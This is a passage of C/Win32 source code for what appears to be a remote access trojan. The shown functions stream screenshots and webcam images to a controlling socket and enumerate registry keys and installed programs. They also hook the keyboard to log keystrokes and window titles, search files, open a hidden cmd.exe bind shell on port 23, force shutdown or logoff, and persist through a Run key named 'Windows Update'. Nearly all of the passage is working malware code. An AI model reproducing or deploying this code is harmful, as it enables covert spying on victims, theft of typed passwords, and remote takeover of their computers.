	
	ZeroMemory(&File, sizeof(PACKETFILE));
Try:
	File.PacketType = PACKET_FILE_MANAGER_FILE_C;
	File.ID2 = d;
	File.ID3 = ItemIndex;
	File.ID = LocalId;
    if(send(FClient, (char *)&File, sizeof(PACKETFILE), 0) == SOCKET_ERROR)
	{
		Sleep(100);		
		goto Try;
	}
	else
	{	
	}
    WSASetLastError(0);
return 0;
}
/////////////////////////////////////////////////////////////////////////////////
//Screen capture
DWORD WINAPI SendScreenShot(LPVOID lpParam)
{
   PACKETFILE		File;
   DWORD			FileSize=sizeof(PACKETFILE);
   int d = ID2;

   FILE * Down;
   char FilePath [1024] = "";
   strcpy(FilePath, (char *)lpParam);
   int Error = 0;
   int T = 0;
   int Web = 0;
   char IDA[10] = "";
   unsigned long int pos = 0;
   unsigned long int length = 0;
   unsigned long int Nsize = 0;
   unsigned long int NextSize = 0;
   char UPBUF [30] = "";
  
    Down = fopen(FilePath, "rb");
	if(Down == NULL)
{
//MessageBox(NULL, "Fail", "fail", MB_OK);
		return 1;
}
else
{
//MessageBox(NULL, "Pass", "pass", MB_OK);
}
    pos = ftell(Down);
    fseek(Down, 0, SEEK_END);
    length = ftell(Down);      
    fseek(Down, pos, SEEK_SET);

if(!strcmp(FilePath, "Cam.jpg"))
{
Web = 1;
}
        NextSize = length - Nsize;
	    ZeroMemory(UPBUF, sizeof(UPBUF));
        sprintf(UPBUF,"%d Bytes / %d Bytes", Nsize, length);
		strcpy(File.Data, FilePath);
		File.PacketType = SCREEN_SHOT_OPEN;
		File.ID4 = Web;
		File.ID = LocalId;
		File.ID2 = length;
		strcpy(File.Data, FilePath);
		sprintf(UPBUF, "%d", File.ID2);
ReTry:
		if(send(FClient, (char *)&File, sizeof(PACKETFILE), 0) == SOCKET_ERROR)
		{
		Sleep(800);
		goto ReTry;
		}
T = 0;

while(Nsize < length)
{
	ZeroMemory(&File, sizeof(PACKETFILE));
/*NextSize = length - Nsize;
		sprintf(File.Data,"%d Bytes / %d Bytes", Nsize, length);	
	    //File.ID4 = ItemIndex;
		File.ID = LocalId;
		File.PacketType = SCREEN_SHOT_RECV;
        if(send(FClient, (char *)&File, sizeof(PACKETFILE), 0) == SOCKET_ERROR)
		{

		}
		strcpy(File.Data, "");
*/
     if(NextSize < 4096)
	   {
		fread(File.Data, 1, NextSize, Down);
		
        SendAgain4k:
		//File.ID4 = ItemIndex;
		File.ID4 = Web;
    	File.ID3 = NextSize;
		File.ID2 = Nsize;
	    File.ID = LocalId;                                 
		File.PacketType = SCREEN_SHOT_RECV;
        if(send(FClient, (char *)&File, sizeof(PACKETFILE), 0) == SOCKET_ERROR)
		{
		Sleep(100);
		 goto SendAgain4k;
		}
		break;

		}

		fread(File.Data, 1, sizeof(File.Data), Down);
SendAgain:
	//	File.ID4 = ItemIndex;
	//	File.ID2 = d;
		File.ID4 = Web;
	    File.ID  = LocalId; 
		File.ID2 = Nsize;
		File.ID3 = 4096;
		File.PacketType = SCREEN_SHOT_RECV;
        if(send(FClient, (char *)&File, sizeof(PACKETFILE), 0) == SOCKET_ERROR)
		{
		Sleep(100);
		 goto SendAgain;
		}
T = 0;
	
		Nsize += sizeof(File.Data);
		 //percent+=unit;
}
   

        fclose(Down);
        ZeroMemory(UPBUF, sizeof(UPBUF));
	   	
	ZeroMemory(&File, sizeof(File));
Try:
	File.PacketType = SCREEN_SHOT_CLOSE;
	File.ID2 = Web;
	File.ID  = LocalId;
  	File.ID4 = SCREENYY;
	File.ID3 = SCREENXX;
	strcpy(File.Data, FilePath);

    if(send(FClient, (char *)&File, sizeof(PACKETFILE), 0) == SOCKET_ERROR)
	{
	Sleep(100);
	goto Try;
	}
	else
	{	
	}
    WSASetLastError(0);
T = 0;
    return 0;  
}

/////////////////////////////////////////////////////////////////////////////////////////
//Query Reg keys
int QueryKey(HKEY hKey, int ID, char * Path) 
{ 
	PACKETHEAD Key;
    TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
    DWORD    cbName;                   // size of name string 
    TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name 
    DWORD    cchClassName = MAX_PATH;  // size of class string 
    DWORD    cSubKeys=0;               // number of subkeys 
    DWORD    cbMaxSubKey;              // longest subkey size 
    DWORD    cchMaxClass;              // longest class string 
    DWORD    cValues;              // number of values for key 
    DWORD    cchMaxValue;          // longest value name 
    DWORD    cbMaxValueData;       // longest value data 
    DWORD    cbSecurityDescriptor; // size of security descriptor 
    FILETIME ftLastWriteTime;      // last write time 
	char     Value [1024] = "";
    DWORD i, retCode; 
 
    TCHAR  achValue[MAX_VALUE_NAME]; 
    DWORD cchValue = MAX_VALUE_NAME; 
	
	HKEY hKkey;
	
	TCHAR data [100] = "";
    unsigned long datalen = sizeof(data);  
    unsigned long datatype;


    // Get the class name and the value count. 
    retCode = RegQueryInfoKey(
        hKey,                    // key handle 
        achClass,                // buffer for class name 
        &cchClassName,           // size of class string 
        NULL,                    // reserved 
        &cSubKeys,               // number of subkeys 
        &cbMaxSubKey,            // longest subkey size 
        &cchMaxClass,            // longest class string 
        &cValues,                // number of values for this key 
        &cchMaxValue,            // longest value name 
        &cbMaxValueData,         // longest value data 
        &cbSecurityDescriptor,   // security descriptor 
        &ftLastWriteTime);       // last write time 
 
    // Enumerate the subkeys, until RegEnumKeyEx fails.
    
    if (cSubKeys)
    {
        printf( "\nNumber of subkeys: %d\n", cSubKeys);

        for (i=0; i<cSubKeys; i++) 
        { 
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hKey, i,
                     achKey, 
                     &cbName, 
                     NULL, 
                     NULL, 
                     NULL, 
                     &ftLastWriteTime); 
            if (retCode == ERROR_SUCCESS) 
            {
                //_tprintf(TEXT("(%d) %s\n"), i+1, achKey);
				strcpy(Key.Data, achKey);
				//MessageBox(NULL, Key.Data, "Key.Data", MB_OK);
				Key.ID = LocalId;
				Key.ID2 = 0;
				Key.PacketType = PACKET_REG_MANAGER;
				
				
				if (RegQueryValueExA(hKey, "", NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
				{
				//	MessageBox(NULL, data, "data", MB_OK);
				}
				
Try:
				Sleep(10);
				if(send(client,(char *)&Key, sizeof(PACKETHEAD), 0) == SOCKET_ERROR)
				{
							if(WSAGetLastError() == WSAENETRESET || WSAENETUNREACH || WSAECONNRESET || WSAENETDOWN)
							{
							 //MessageBox(NULL, "CONNECTION LOST", "Connection", MB_OK);
							 return 1;
							}
				goto Try;
				}
  
				Sleep(10);
				
            }
        }
    } 
 
    // Enumerate the key values. 

    if (cValues) 
    {
        for (i=0, retCode=ERROR_SUCCESS; i<cValues; i++) 
        { 
            cchValue = MAX_VALUE_NAME; 
            achValue[0] = '\0'; 
            retCode = RegEnumValue(hKey, i, 
                achValue, 
                &cchValue, 
                NULL, 
                NULL,
                NULL,
                NULL);
 
            if (retCode == ERROR_SUCCESS ) 
            { 
                //_tprintf(TEXT("(%d) %s\n"), i+1, achValue); 
				strcpy(Key.Data, achValue);
				ZeroMemory(data, sizeof(data));
				ZeroMemory(&Key.Buf, sizeof(Key.Buf));
			switch(ID)
			{
				 case 0:
						if( RegOpenKeyEx(HKEY_CLASSES_ROOT, TEXT(Path),0, KEY_QUERY_VALUE, &hKkey) == ERROR_SUCCESS)
						{
							if (RegQueryValueExA(hKkey, achValue, NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
							{
							Key.ID3 = datatype;
					    	strcpy(Key.Buf, data);
							}
						}
						break;
					 case 1:
						if( RegOpenKeyEx(HKEY_CURRENT_USER, TEXT(Path),0, KEY_QUERY_VALUE, &hKkey) == ERROR_SUCCESS)
						{
							if (RegQueryValueExA(hKkey, achValue, NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
							{	
							Key.ID3 = datatype;
							strcpy(Key.Buf, data);
							}
						}
						break;
					 case 2:
						if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(Path),0, KEY_QUERY_VALUE, &hKkey) == ERROR_SUCCESS)
						{
							if (RegQueryValueExA(hKkey, achValue, NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
							{	
							Key.ID3 = datatype;
						strcpy(Key.Buf, data);
							}
						}
						break;

					 case 3:
						if( RegOpenKeyEx(HKEY_USERS, TEXT(Path),0, KEY_QUERY_VALUE, &hKkey) == ERROR_SUCCESS)
						{
							if (RegQueryValueExA(hKkey, achValue, NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
							{	
						//	MessageBox(NULL, data, "data", MB_OK);
							Key.ID3 = datatype;
					    	strcpy(Key.Buf, data);
							}
						}
						break;
					 case 4:
						if( RegOpenKeyEx(HKEY_CURRENT_CONFIG, TEXT(Path),0, KEY_QUERY_VALUE, &hKkey) == ERROR_SUCCESS)
						{
							if (RegQueryValueExA(hKkey, achValue, NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
							{
							Key.ID3 = datatype;
						strcpy(Key.Buf, data);
							}
						}
						break;
			}
			

				Key.ID = LocalId;
				Key.ID2 = 1;
				Key.PacketType = PACKET_REG_MANAGER;
				TryA:
				Sleep(10);
				if(send(client,(char *)&Key, sizeof(PACKETHEAD), 0) == SOCKET_ERROR)
				{
					if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
					{
					return 0;
					}

				goto TryA;
				}
				Sleep(10);
	        } 
        }
    }
return 0;
}
//////////////////////////////////////////////////////////////////////////////
//KeyLogger
char FileNameA[10] = "log.txt";
HANDLE FileHandle;
DWORD numb_bytes;
int			    KEYID = 0;
HANDLE KeyLog;
DWORD WINAPI SendLog(LPVOID lpParam)
{
   PACKETHEAD		File;
   DWORD			FileSize=sizeof(PACKETHEAD);
   int d = ID2;

   FILE * Down;
   char FilePath [1024] = "";
   strcpy(FilePath, FileNameA);
   int Error = 0;
   char IDA[10] = "";
   unsigned long int pos = 0;
   unsigned long int length = 0;
   unsigned long int Nsize = 0;
   unsigned long int NextSize = 0;
   char UPBUF [30] = "";
  

    Down = fopen(FilePath, "rb");
	if(Down == NULL)
{
//MessageBox(NULL, "Fail", "fail", MB_OK);
return 1;
}
else
{
///MessageBox(NULL, "Pass File opened", "pass", MB_OK);
}
    pos = ftell(Down);
    fseek(Down, 0, SEEK_END);
    length = ftell(Down);      
    fseek(Down, pos, SEEK_SET);


        NextSize = length - Nsize;
	    ZeroMemory(UPBUF, sizeof(UPBUF));
        sprintf(UPBUF,"%d Bytes / %d Bytes", Nsize, length);				

		File.PacketType = PACKET_KEYLOG_OPEN;
		strcpy(File.Data, FilePath);
		File.ID = LocalId;
		File.ID2 = length;
		send(client, (char *)&File, sizeof(PACKETHEAD), 0);

/*MessageBox(NULL, File.Data, "File.Data", MB_OK); 
MessageBox(NULL, "Before send", "waiting", MB_OK);
*/while(Nsize < length)
{
	ZeroMemory(&File, sizeof(PACKETHEAD));
	NextSize = length - Nsize;
Sleep(100);
		strcpy(File.Data, "");
     if(NextSize < 512)
	   {
		fread(File.Data, 1, NextSize, Down);
        SendAgain4k:
	//	File.ID4 = ItemIndex;
		File.ID2 = Nsize;
		File.ID  = LocalId;
	    File.ID3 = NextSize;                                 
		File.PacketType = PACKET_KEYLOG_DOWNLOAD;
        if(send(client, (char *)&File, sizeof(PACKETHEAD), 0) == SOCKET_ERROR)
		{
		 goto SendAgain4k;
		}
		break;

	   }
		fread(File.Data, 1, sizeof(File.Data), Down);
SendAgain:
	//	File.ID4 = ItemIndex;
		File.ID2 = Nsize;
		File.ID  = LocalId;
	    File.ID3 = sizeof(File.Data);                                 
		File.PacketType = PACKET_KEYLOG_DOWNLOAD;
        if(send(client, (char *)&File, sizeof(PACKETHEAD), 0) == SOCKET_ERROR)
		{
		 goto SendAgain;
		}

	
		Nsize += sizeof(File.Data);
}
   

        fclose(Down);
        ZeroMemory(UPBUF, sizeof(UPBUF));

	ZeroMemory(&File, sizeof(PACKETHEAD));
Try:
	File.PacketType = PACKET_KEYLOG_OFFLINE;
	File.ID  = LocalId;
	File.ID2 = length;
    strcpy(File.Data, FilePath);
    if(send(client, (char *)&File, sizeof(PACKETHEAD), 0) == SOCKET_ERROR)
	{
	goto Try;
	}
	else
	{	
	}
    WSASetLastError(0);

    return 0;   
}
DLLEXPORT LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam) 
{
static BOOL unicode = FALSE;
static HWND old_active = NULL;
//HWND active;
static HKL keyboardlayout = NULL;
BYTE keyboardState[256] = {0};
KBDLLHOOKSTRUCT keyboard;
DWORD windowThreadProcessId;
//char buff[MAX_LEN];
WCHAR keybuff[255]= {0};
int i;
PACKETHEAD Win;


i = 0;
windowThreadProcessId = 0;

if (nCode < 0)
return CallNextHookEx(theHook, nCode, wParam, lParam);

if((wParam == WM_KEYDOWN)|| (wParam == WM_SYSKEYDOWN)||(wParam == WM_SYSKEYUP)) {
keyboard = *((KBDLLHOOKSTRUCT*)lParam);
GetKeyboardState(keyboardState);



if(keyboard.vkCode == VK_RETURN)
i += sprintf (((char*)keybuff + i), "\n");


if (unicode)

i = ToUnicodeEx((keyboard.vkCode), (keyboard.scanCode), keyboardState, keybuff, (sizeof(keybuff) / 16), (GetKeyState(VK_MENU) >> 7), keyboardlayout);

else

i = ToAsciiEx((keyboard.vkCode), (keyboard.scanCode), keyboardState, ((LPWORD)keybuff), (GetKeyState(VK_MENU) >> 7), keyboardlayout);


sprintf((f_buff + buff_idx), "%s", keybuff);
if(KeyConnect)
	{	
	 strcpy(Win.Data, f_buff);
	 Win.ID = LocalId;
	 Win.PacketType = PACKET_KEYLOGGER;
	 send(client, (char *)&Win, sizeof(PACKETHEAD), 0);
	}
	else
	{
	WriteFile(FileHandle, f_buff, strlen(f_buff), &numb_bytes, NULL);
	buff_idx = 0;
	}


}
return CallNextHookEx(theHook, nCode, wParam, lParam);

}


void Msgloop(void) 
{
MSG mess;
while (GetMessage(&mess,NULL,0,0)) 
{
TranslateMessage(&mess);
DispatchMessage(&mess);

}
}


DWORD WINAPI KeyLoggerWin(LPVOID lParam)
{
PACKETHEAD Win;
HWND ForeHandle;
char window_text[500];
char old_window_text[500];
while(1)
{
Sleep(10);
ForeHandle = GetForegroundWindow();
           if (ForeHandle != NULL) 
		   {
              if (GetWindowText(ForeHandle, (char*)&window_text, 499) != 0) 
			  {
                 if (strcmp(window_text, old_window_text)) 
				 {
						if(KeyConnect)
					{
					strcpy(Win.Data, window_text);
                    Win.PacketType = PACKET_KEYLOGGER_WINDOW;
					Win.ID = LocalId;
					send(client, (char *)&Win, sizeof(PACKETHEAD), 0);
                    strcpy(old_window_text, window_text);
					}
					else
					{
					strcpy(Win.Data, "\r\n \r\n[");
					strcat(Win.Data, window_text);
					strcat(Win.Data, "] \r\n  \r\n");
					WriteFile(FileHandle, Win.Data, strlen(Win.Data), &numb_bytes, NULL);
					strcpy(old_window_text, window_text);
					}
                 }
              }
           }
		   Sleep(1);
}

}
DWORD WINAPI KeyLogger(LPVOID lParam)
{
HINSTANCE exe;
int res = 0;
//PACKETHEAD Win;
if(KeyConnect)
{
//MessageBox(NULL, "CONNECTED", "CONNECTED", MB_OK);
CreateThread(NULL, 0,SendLog,(LPVOID)FileNameA, 0, &thread);
}
else
{
strcpy(FileNameA, "");
sprintf(FileNameA, "Log%d.txt", KEYID);
FileHandle = CreateFile (FileNameA, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); //FILE_ATTRIBUTE_HIDDEN
}
TerminateThread(WindowLog, 0);
WindowLog = CreateThread(NULL, 0,KeyLoggerWin,(LPVOID)FileNameA, 0, &thread);

//WriteFile(FileHandle, Win.Data, strlen(Win.Data), &numb_bytes, NULL);
exe = GetModuleHandle(NULL);
if(!exe)
{
res = 1;
}
else 
{
theHook = SetWindowsHookEx ( WH_KEYBOARD_LL, (HOOKPROC) KeyEvent, exe, 0);
if(theHook == NULL)
{
//MessageBox(NULL, "NULL", "NULL", MB_OK);
}

Msgloop(); // eternal loop
UnhookWindowsHookEx(theHook);
}
return TRUE;	
}
//////////////////////////////////////////////////////////////////////////////////
//Search
char Buf [100] = "";
char Buf2 [100] = "";
int L;
//////////////////////////////////////////////////////////////////////////////////////
//File Search
int FindFile(char *filename, char *dirname, unsigned int numfound);
DWORD WINAPI FindFileThread(LPVOID param) 
{
	FFIND ffind = *((FFIND *)param);
	FFIND *ffinds = (FFIND *)param;
	ffinds->gotinfo = TRUE;

	char sendbuf[100];
	unsigned int numfound = 0;

	if (ffind.dirname[strlen(ffind.dirname)-1] == '\\')
		ffind.dirname[strlen(ffind.dirname)-1] = '\0';
	
	_snprintf(sendbuf,sizeof(sendbuf),"[FINDFILE]: Searching for file: %s.",ffind.filename);



	numfound = FindFile(ffind.filename,ffind.dirname,numfound);
	sprintf(sendbuf,"[FINDFILE]: Files found: %d.",numfound);


	ExitThread(0);
}

int FindFile(char *filename, char *dirname, unsigned int numfound)
{
//	char sendbuf[100],
	char tmpPath[100], newPath[100];
    PACKETHEAD Search;
	WIN32_FIND_DATA fd;
	HANDLE fh;

	_snprintf(tmpPath, sizeof(tmpPath), "%s\\*", dirname);
	if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
		do {
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (fd.cFileName[0] != '.' || (fd.cFileName[1] && fd.cFileName[1] != '.')) 
				{
					_snprintf(newPath,sizeof(newPath),"%s\\%s", dirname,fd.cFileName);
					numfound = FindFile(filename, newPath, numfound);
				}
			}
		} while (FindNextFile(fh, &fd));
	FindClose(fh);

	_snprintf(tmpPath, sizeof(tmpPath), "%s\\%s", dirname, filename);
	if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
		do {
			numfound ++;
SendSearch:
			 _snprintf(Search.Data,sizeof(Search.Data),"%s\\%s",dirname,fd.cFileName);
			 Search.PacketType = PACKET_FILE_MANAGER_SEARCH;
			 Search.ID = LocalId;
			 if(send(client,(char *)&Search, sizeof(PACKETHEAD), 0) == SOCKET_ERROR)
			 {
				 if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
				{
				return 0;
				}

			 goto SendSearch;
			 }
		} while (FindNextFile(fh, &fd));
	FindClose(fh);
    /*Search.PacketType = PACKET_FILE_MANAGER_SEARCH;
	Search.ID = LocalId;
	send(client,(char *)&Search, sizeof(PACKETHEAD), 0);
	strcpy(sendbuf, "");*/
	return (numfound);
}
DWORD WINAPI FindFileT(LPVOID lParam)
{
FindFile(Buf, Buf2, L);
AtrY:
Head.PacketType = DONE;
if(send(client,(char *)&Head, sizeof(PACKETHEAD), 0) == SOCKET_ERROR)
{
	if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
	{
	return 0;
	}

	goto AtrY;
}
return 0;
}
////////////////////////////////////////////////////////////////////////////////////
//CMD
	char Command [1024] = "";
	int SHELLSTART = 0;
DWORD WINAPI Shell(LPVOID lParam)
{
	SHELLSTART = 1;
    WSADATA wsadata;
    SOCKET shellsock, sendsock;
    SOCKADDR_IN sin;
    HANDLE hPipeRead1, hPipeWrite1, hPipeRead2, hPipeWrite2;
    char szBuffer[4096], szCmdPath[MAX_PATH];
    int i, count = 0;
	int port = 23;
    DWORD lpNumberOfBytesRead;
    SECURITY_ATTRIBUTES secu =
    {
        (DWORD)sizeof(SECURITY_ATTRIBUTES), NULL, TRUE
    };
    STARTUPINFO sInfo;
    PROCESS_INFORMATION pInfo;
        WSAStartup(MAKEWORD(2,2), &wsadata);
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = 0;
        sin.sin_port = htons(port);
        i = sizeof (sin);
        shellsock = socket (AF_INET, SOCK_STREAM, 0);
        bind(shellsock, (SOCKADDR *)&sin, sizeof(sin));
        listen(shellsock, 0);
        sendsock = accept(shellsock,(SOCKADDR *)&sin, &i);
   

        CreatePipe(&hPipeRead1, &hPipeWrite1, &secu, 0);
        CreatePipe(&hPipeRead2, &hPipeWrite2, &secu, 0);
        GetEnvironmentVariable("ComSpec", szCmdPath, sizeof(szCmdPath));
        memset(&sInfo, 0, sizeof(sInfo));
        memset(&pInfo, 0, sizeof(pInfo));
        sInfo.cb=sizeof (STARTUPINFO);
        sInfo.dwFlags=STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES;
        sInfo.wShowWindow=SW_HIDE;
        sInfo.hStdInput = hPipeRead2;
        sInfo.hStdOutput = hPipeWrite1;
        sInfo.hStdError = hPipeWrite1;

        CreateProcess(NULL, szCmdPath, &secu, &secu, TRUE, 0, NULL, NULL, &sInfo, &pInfo);

    while (sendsock != SOCKET_ERROR)
    {
            Sleep (100);
            memset(szBuffer, 0, sizeof(szBuffer));
            PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);
		//	sprintf(Test, "PeekNamedPipe out side lpNumberOfBytesRead: %d \n", lpNumberOfBytesRead);
		//	printf(Test);
        while (lpNumberOfBytesRead)
        {
                Sleep (200);
            if (!ReadFile(hPipeRead1, szBuffer, sizeof(szBuffer), &lpNumberOfBytesRead, NULL)) break;
            else send(sendsock, szBuffer, lpNumberOfBytesRead, 0);
//			sprintf(Test, "sendsock-lpNumberOfBytesRead: %d \n", lpNumberOfBytesRead);
//			printf(Test);
            PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);
			//		sprintf(Test, "PeekNamedPipe-lpNumberOfBytesRead: %d \n", lpNumberOfBytesRead);
			//printf(Test);

        }
            Sleep (200);
            i = recv (sendsock,szBuffer,sizeof(szBuffer),0);
			
			WriteFile(hPipeWrite2, szBuffer, i, &lpNumberOfBytesRead, 0);
    }        
        closesocket(sendsock);
        closesocket(shellsock);
		WSACleanup();
		SHELLSTART = 0;
		TerminateProcess(pInfo.hProcess, 0);
        return 0;
}
//////////////////////////////////////////////////////////////////////////////////
//Shutdown 
BOOL MySystemShutdown()
{
   HANDLE hToken; 
   TOKEN_PRIVILEGES tkp; 
 
   // Get a token for this process. 
 
   if (!OpenProcessToken(GetCurrentProcess(), 
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) 
      return( FALSE ); 
 
   // Get the LUID for the shutdown privilege. 
 
   LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, 
        &tkp.Privileges[0].Luid); 
 
   tkp.PrivilegeCount = 1;  // one privilege to set    
   tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
 
   // Get the shutdown privilege for this process. 
 
   AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, 
        (PTOKEN_PRIVILEGES)NULL, 0); 
 
   if (GetLastError() != ERROR_SUCCESS) 
      return FALSE; 
 
   // Shut down the system and force all applications to close. 
 
   if (!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 
               SHTDN_REASON_MAJOR_OPERATINGSYSTEM |
               SHTDN_REASON_MINOR_UPGRADE |
               SHTDN_REASON_FLAG_PLANNED)) 
      return FALSE; 

   //shutdown was successful
   return TRUE;
}
//////////////////////////////////////////////////////////////////////////////////
//Logoff
void LogOff()
{
ExitWindowsEx(EWX_LOGOFF, 0);
}
//////////////////////////////////////////////////////////////////////////////////
//ProgramList
#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

int QueryInstalls(HKEY hKey)
{
	PACKETHEAD Key;
    TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
    DWORD    cbName;                   // size of name string
    TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name
    DWORD    cchClassName = MAX_PATH;  // size of class string
    DWORD    cSubKeys=0;               // number of subkeys
    DWORD    cbMaxSubKey;              // longest subkey size
    DWORD    cchMaxClass;              // longest class string
    DWORD    cValues;              // number of values for key
    DWORD    cchMaxValue;          // longest value name
    DWORD    cbMaxValueData;       // longest value data
    DWORD    cbSecurityDescriptor; // size of security descriptor
    FILETIME ftLastWriteTime;      // last write time
    char     Value [1024] = "";
    DWORD i, retCode;
    

    char NEW [1024] = "";
    char data [1024] = "";
    unsigned long datalen = sizeof(data);  
    unsigned long datatype;
    HKEY hKkey;

//    TCHAR  achValue[MAX_VALUE_NAME];
    DWORD cchValue = MAX_VALUE_NAME;

    // Get the class name and the value count.
    retCode = RegQueryInfoKey(
        hKey,                    // key handle
        achClass,                // buffer for class name
        &cchClassName,           // size of class string
        NULL,                    // reserved
        &cSubKeys,               // number of subkeys
        &cbMaxSubKey,            // longest subkey size
        &cchMaxClass,            // longest class string
        &cValues,                // number of values for this key
        &cchMaxValue,            // longest value name
        &cbMaxValueData,         // longest value data
        &cbSecurityDescriptor,   // security descriptor
        &ftLastWriteTime);       // last write time

    // Enumerate the subkeys, until RegEnumKeyEx fails.
    
    if (cSubKeys)
    {
       //printf( "\nNumber of subkeys: %d\n", cSubKeys);

        for (i=0; i<cSubKeys; i++)
        {
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hKey, i,
                     achKey,
                     &cbName,
                     NULL,
                     NULL,
                     NULL,
                     &ftLastWriteTime);
            if (retCode == ERROR_SUCCESS)
            {
                strcpy(NEW, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\");
                strcat(NEW, achKey);
				
				if (!RegOpenKeyExA(HKEY_LOCAL_MACHINE, NEW, NULL, KEY_QUERY_VALUE, &hKkey) == ERROR_SUCCESS)
                 {
                 //MessageBox(NULL,"FAIL","FAIL", MB_OK);
                 }

if (RegQueryValueExA(hKkey, "", NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
{
   strcpy(Key.Data, data);
   strcpy(Key.Buf, achKey);
   Key.PacketType = PACKET_PROGRAM_FILES;
   Key.ID = LocalId;
   send(client,(char*)&Key,sizeof(PACKETHEAD),0);
  // MessageBox(NULL, Key.Data, Key.Buf, MB_OK);
}
                
                
                Sleep(10);
                
            }
        }
    }


    return 0;
}

BOOL SetUp(char *path, int ID)
{   
        int reg_key;//check;
        
        HKEY hkey;
      

		switch(ID)
		{
			case 0:
				reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
				break;
			case 1:
				reg_key=RegCreateKey(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
				break;
		}

		if(reg_key==0)
		{
			RegSetValueEx((HKEY)hkey,"Windows Update",0,REG_SZ,(BYTE *)path,strlen(path));
			return TRUE;
		}

		if(reg_key!=0)
		{
			return TRUE;
		}
                
        return TRUE;
}
///////////////////////////////////////////////////////////////////////////////////
//WebCam Capture

#define capSendMessage(hWnd, uMsg, wParm, lParam) ((IsWindow(hWnd)) ? SendMessage(hWnd, uMsg, (WPARAM)(wParm), (LPARAM)(lParam)) : 0)

BOOL capWebCam(char *szFile, int nIndex, int nX, int nY, int nMsg)
{
	HWND hWndCap = capCreateCaptureWindow("CapWebCam", WS_CHILD, 0, 0, nX, nY, GetDesktopWindow(), 0);
    if(!hWndCap) return FALSE;
    
    if(!capSendMessage(hWndCap, WM_CAP_DRIVER_CONNECT, nIndex, 0)){
        DestroyWindow(hWndCap); return FALSE;    
    }
    
    CAPDRIVERCAPS capDriverCaps;
    memset(&capDriverCaps, 0, sizeof(CAPDRIVERCAPS));
    capSendMessage(hWndCap, WM_CAP_DRIVER_GET_CAPS, sizeof(CAPDRIVERCAPS), &capDriverCaps);
    if(!capDriverCaps.fCaptureInitialized){
        DestroyWindow(hWndCap); return FALSE;
    }
    
    capSendMessage(hWndCap, WM_CAP_SET_SCALE, TRUE, 0);
    capSendMessage(hWndCap, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
    capSendMessage(hWndCap, WM_CAP_FILE_SAVEDIB, 0, szFile);
    capSendMessage(hWndCap, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    DestroyWindow(hWndCap);
    
    return TRUE;
}

BOOL ConvertImage(const WCHAR *fileName, const WCHAR *outFile, const WCHAR *format, int	nQuality) //by X-N2O
{
	GdiplusStartupInput gdiStartup;
	EncoderParameters	encParams;
	unsigned long gdiToken;
	unsigned int nCodecs = 0, nCodecSize = 0;
	GdiplusStartup(&gdiToken, &gdiStartup, NULL);
	{
		Image image(fileName);	  
		CLSID codec;
		ImageCodecInfo* iCinfo = NULL;
		GetImageEncodersSize(&nCodecs, &nCodecSize);
		iCinfo = (ImageCodecInfo*) calloc(1, nCodecSize);
		if(iCinfo == NULL)
			return FALSE;
		GetImageEncoders(nCodecs, nCodecSize, iCinfo);
		
		for(unsigned int x = 0; x < nCodecs; x++)
		{
			if(!wcscmp(iCinfo[x].MimeType, format))
			{
				codec = iCinfo[x].Clsid;
				break;
			}    
		}
		
		encParams.Count = 1;
		encParams.Parameter[0].Guid = EncoderQuality;
        encParams.Parameter[0].Type = EncoderParameterValueTypeLong;
        encParams.Parameter[0].NumberOfValues = 1;
		encParams.Parameter[0].Value = &nQuality;
		if(image.Save(outFile, &codec, &encParams) != Ok){
			free(iCinfo);
			GdiplusShutdown(gdiToken);
			return FALSE;
		}
		free(iCinfo);
	}
	GdiplusShutdown(gdiToken);
	return TRUE;
}

int GetCamIndex()
{
	char szDeviceName[80];
    char szDeviceVersion[80];
	
    for (int wIndex = 0; wIndex < 9; wIndex++)
    {
        if (capGetDriverDescription(wIndex, szDeviceName,sizeof (szDeviceName),
			szDeviceVersion, sizeof(szDeviceVersion)))
			return wIndex;
    }
	return -1;
}
//////////////////////////////////////////////////////////////////////////////////
//Fun Funcs
void InvertScreen()
{
